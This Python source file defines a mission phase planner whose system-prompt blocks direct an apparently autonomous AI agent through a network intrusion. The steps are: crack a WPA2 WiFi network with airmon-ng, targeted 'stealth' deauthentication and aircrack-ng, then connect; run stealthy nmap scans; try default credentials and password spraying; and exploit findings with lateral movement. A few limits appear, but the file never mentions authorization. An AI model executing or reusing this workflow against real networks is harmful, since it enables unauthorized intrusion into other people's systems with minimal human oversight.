"""Phase state machine for the mission."""

from enum import IntEnum


class Phase(IntEnum):
    WIFI_BREACH = 0
    RECON = 1
    ENUMERATE = 2
    EXPLOIT = 3
    CLEANUP = 4


PHASE_NAMES = {
    Phase.WIFI_BREACH: "WIFI BREACH",
    Phase.RECON: "RECON & MAP",
    Phase.ENUMERATE: "ENUMERATE",
    Phase.EXPLOIT: "EXPLOIT & PIVOT",
    Phase.CLEANUP: "CLEANUP & REPORT",
}

# Phase-specific system prompt context blocks
PHASE_CONTEXTS = {
    Phase.WIFI_BREACH: """PHASE 0: WiFi BREACH — NO NETWORK, NO THOR, FULLY AUTONOMOUS

You have NO connectivity. You must crack a WiFi network.

Workflow:
1. Put external adapter into monitor mode: airmon-ng start wlan1
2. Scan for networks: airodump-ng wlan1mon
3. Target a WPA2-PSK network (skip WPA2-Enterprise)
   Prefer: strongest signal, most clients, PSK auth
4. Capture handshake — use TARGETED deauth (not broadcast):
   airodump-ng -c <CH> --bssid <BSSID> -w /tmp/capture wlan1mon
   aireplay-ng -0 3 -a <BSSID> -c <CLIENT_MAC> wlan1mon
5. Crack: aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap
6. Connect: wpa_passphrase <ESSID> <PASSWORD> > /tmp/wpa.conf
   wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf && dhclient wlan0
7. Verify: ip addr show wlan0 && tailscale status

DEAUTH STEALTH: always specify -c <client_mac>. Count 3-5, not 20.

EXIT: WiFi connected + IP obtained""",

    Phase.RECON: """PHASE 1: RECON — Map the network, find targets.
Tailscale may come online. Use nmap stealth scans.

nmap -sS -T2 --top-ports 1000 <subnet>
Look for: DCs (445+88), web servers (80/443), databases (3306/5432/1433)

If on isolated guest VLAN (only gateway visible), consider cracking a second SSID.

EXIT: 3+ live hosts with open services, OR 30 min timeout""",

    Phase.ENUMERATE: """PHASE 2: ENUMERATION — Deep-dive discovered services.
Tools: nxc, smbclient, gobuster, curl, nikto, enum4linux
Try null sessions, default creds, anonymous access.
Respect lockout thresholds — if you see lockouts, STOP spraying.

EXIT: 1+ vulnerability or credential found, OR all services enumerated""",

    Phase.EXPLOIT: """PHASE 3: EXPLOITATION — Demonstrate impact with found creds/vulns.
Validate access, enumerate sensitive data, check lateral movement.
DO NOT: destroy data, install backdoors, exfiltrate real data, cause outages.

EXIT: Impact documented, OR no exploitable path (document negative finding)""",

    Phase.CLEANUP: """PHASE 4: CLEANUP — Verify findings logged, disconnect sessions, sync to Thor.""",
}


class PhasePlanner:
    """Manages phase transitions based on mission state."""

    def __init__(self, config: dict):
        # If we already have network connectivity, skip WiFi breach
        self.current_phase = Phase.WIFI_BREACH
        self.mission_complete = False
        self.phase_start_time = None
        self.config = config
        self._phase_timeouts = {
            Phase.WIFI_BREACH: 60 * 45,  # 45 min
            Phase.RECON: 60 * 30,        # 30 min
            Phase.ENUMERATE: 60 * 60,    # 60 min
            Phase.EXPLOIT: 60 * 90,      # 90 min
            Phase.CLEANUP: 60 * 15,      # 15 min
        }

    @property
    def phase_name(self) -> str:
        return PHASE_NAMES[self.current_phase]

    @property
    def phase_context(self) -> str:
        return PHASE_CONTEXTS[self.current_phase]

    def evaluate(self, mission_log) -> bool:
        """Check if we should transition phases. Returns True if phase changed."""
        findings = mission_log.get_findings_summary()

        if self.current_phase == Phase.WIFI_BREACH:
            if findings.get("wifi_connected"):
                return self._advance()

        elif self.current_phase == Phase.RECON:
            hosts = findings.get("live_hosts", 0)
            if hosts >= 3:
                return self._advance()

        elif self.current_phase == Phase.ENUMERATE:
            vulns = findings.get("vulnerabilities", 0)
            creds = findings.get("credentials", 0)
            if vulns > 0 or creds > 0:
                return self._advance()

        elif self.current_phase == Phase.EXPLOIT:
            if findings.get("impact_documented"):
                return self._advance()

        elif self.current_phase == Phase.CLEANUP:
            if findings.get("cleanup_done"):
                self.mission_complete = True
                return True

        return False

    def force_phase(self, phase_name: str):
        """Force transition to a specific phase (e.g., watchdog expiry)."""
        name_map = {
            "wifi": Phase.WIFI_BREACH,
            "recon": Phase.RECON,
            "enumerate": Phase.ENUMERATE,
            "exploit": Phase.EXPLOIT,
            "cleanup": Phase.CLEANUP,
        }
        if phase_name in name_map:
            self.current_phase = name_map[phase_name]

    def _advance(self) -> bool:
        if self.current_phase < Phase.CLEANUP:
            self.current_phase = Phase(self.current_phase + 1)
            return True
        return False
